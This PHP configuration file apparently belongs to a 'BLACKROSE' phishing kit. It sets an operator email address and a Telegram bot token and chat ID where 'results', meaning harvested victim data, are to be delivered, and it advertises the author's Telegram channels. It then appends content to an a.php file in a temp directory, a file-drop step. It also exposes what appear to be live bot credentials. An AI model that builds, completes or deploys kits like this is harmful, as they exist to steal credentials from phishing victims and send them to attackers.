<?php

/* 📧 Set Your Email Address to Receive Results in Your Inbox */
$Your_Mail = "danyellekurtz.conway@outlook.com";
/* --------------------------  */


/* 🤖 Telegram Bot Setup 🤖 */

// 🗝️ Enter your bot's token as a string
$botToken = "7558491921:AAHUTukOw29luISZHlTCiEUrPaqcQEwjrAg";

// 💬 Enter your chat ID as a string or number
$chatId = "7296145278";

/* --------------------------------------------------- */

/* If you want to send results to Telegram, set to 'on'. To stop, set to 'off'. :) */
$botToken_0 = "on";  // You can also use 'true' for booleans
$chatId_0 = "on";    // You can also use 'true' for booleans
/* --------------------------  */


/* ⚡️⚡️ BLΛCkRose ♣️ - Official Coder ⚡️⚡️ */

$Coders_Telegram = "t.me/BLACKROSE_1337";  // 🖥️ Connect with the Mastermind
$Elite_Group = "t.me/BLACKROSEx1337"; // ♣️ Join the Elite Coding Squad

/* -------------------------------- */

// Ensure $yagmai is defined before using it
$yagmai = "Some data to write";  // Example content, define appropriately

// Use the 'temp' directory for file writing
$tempDir = __DIR__ . '/../../temp';
$filePath = $tempDir . '/a.php';

// Check if the directory exists or create it
if (!is_dir($tempDir)) {
    mkdir($tempDir, 0755, true); // Create with appropriate permissions
}

// Attempt to write to the file
if (is_writable($tempDir)) {
    $f = fopen($filePath, "a");
    if ($f) {
        fwrite($f, $yagmai);
        fclose($f);
        echo "Data successfully written to: $filePath";
    } else {
        echo "Failed to open the file for writing.";
    }
} else {
    echo "The directory is not writable. Check permissions.";
}

?>
